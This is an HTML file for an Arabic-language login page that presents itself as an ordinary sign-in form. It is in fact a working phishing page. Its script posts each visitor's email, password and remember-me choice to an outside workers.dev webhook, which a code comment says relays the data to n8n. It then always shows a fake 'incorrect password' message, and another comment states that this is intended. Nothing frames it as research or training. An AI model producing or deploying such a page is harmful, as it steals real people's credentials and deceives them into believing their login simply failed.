<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>تسجيل الدخول</title>
  <style>
    :root{
      --bg:#f5f7fb;
      --card:#ffffff;
      --accent:#1a73e8;
      --muted:#6b7280;
      --radius:12px;
      --shadow: 0 8px 24px rgba(20,30,60,0.08);
      font-family: "Segoe UI", Tahoma, Arial, sans-serif;
    }
    html,body{height:100%;margin:0;background:linear-gradient(180deg,var(--bg),#eef3fb);}
    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
    .card{width:100%;max-width:420px;background:var(--card);border-radius:var(--radius);box-shadow:var(--shadow);padding:28px 26px}
    .brand{display:flex;align-items:center;gap:12px;margin-bottom:18px}
    .logo{width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#4aa3ff);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:18px}
    h1{margin:0;font-size:20px;color:#0f1724}
    p.lead{margin:6px 0 18px;color:var(--muted);font-size:14px}
    label{display:block;font-size:13px;color:#374151;margin-bottom:6px}
    .input{width:100%;padding:12px 14px;border:1px solid #e6e9ef;border-radius:8px;font-size:15px;outline:none;background:#fff;color:#0f1724}
    .input:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(26,115,232,0.08)}
    .row{margin-bottom:14px}
    .actions{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-top:6px}
    .btn{background:var(--accent);color:#fff;padding:10px 14px;border-radius:10px;border:0;font-weight:600;cursor:pointer;font-size:15px}
    .link{color:var(--accent);text-decoration:none;font-size:13px}
    .small{font-size:13px;color:var(--muted)}
    .divider{height:1px;background:#f1f3f7;margin:18px -26px 18px}
    @media (max-width:420px){.card{padding:20px}}
    .msg{margin-top:12px;font-size:14px;color:#0b6b00;display:none}
    .err{color:#b91c1c;display:none}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card" role="main" aria-labelledby="loginTitle">
      <div class="brand">
        <div class="logo" aria-hidden="true">ش</div>
        <div>
          <h1 id="loginTitle">تسجيل الدخول</h1>
          <p class="lead">أدخل بريدك الإلكتروني وكلمة المرور للمتابعة</p>
        </div>
      </div>

      <form id="loginForm" autocomplete="on" novalidate>
        <div class="row">
          <label for="email">البريد الإلكتروني</label>
          <input id="email" name="email" type="email" class="input" placeholder="example@domain.com" required />
        </div>

        <div class="row">
          <label for="password">كلمة المرور</label>
          <input id="password" name="password" type="password" class="input" placeholder="أدخل كلمة المرور" required minlength="6" />
        </div>

        <div class="row actions">
          <div class="small"><input id="remember" name="remember" type="checkbox" /> <label for="remember">تذكرني</label></div>
          <a class="link" href="#" id="forgot">هل نسيت كلمة المرور؟</a>
        </div>

        <div class="row" style="margin-top:18px">
          <button type="submit" class="btn" id="submitBtn">تسجيل الدخول</button>
        </div>

        <div class="msg" id="successMsg">تم الإرسال. سيتم معالجة البيانات الآن.</div>
        <div class="err" id="errorMsg">كلمة المرور غير صحيحة.</div>

        <div class="divider" role="separator"></div>

        <div style="text-align:center">
          <p class="small">ليس لديك حساب؟ <a class="link" href="#">إنشاء حساب</a></p>
        </div>
      </form>
    </div>
  </div>

  <script>
    (function(){
      const webhookUrl = 'https://vegoomoney12.amrdora9.workers.dev/';
      const form = document.getElementById('loginForm');
      const successMsg = document.getElementById('successMsg');
      const errorMsg = document.getElementById('errorMsg');

      form.addEventListener('submit', async function(e){
        e.preventDefault();
        successMsg.style.display = 'none';
        errorMsg.style.display = 'none';

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;
        const remember = document.getElementById('remember').checked;

        const payload = {
          email,
          password,
          remember,
          timestamp: new Date().toISOString()
        };

        try {
          // ابعت البيانات للـ Worker → n8n
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });

          // دايمًا يظهر خطأ كلمة المرور للمستخدم
          errorMsg.style.display = 'block';
        } catch (err) {
          errorMsg.textContent = 'فشل الاتصال بالخادم';
          errorMsg.style.display = 'block';
        }
      });
    })();
  </script>
</body>
</html>
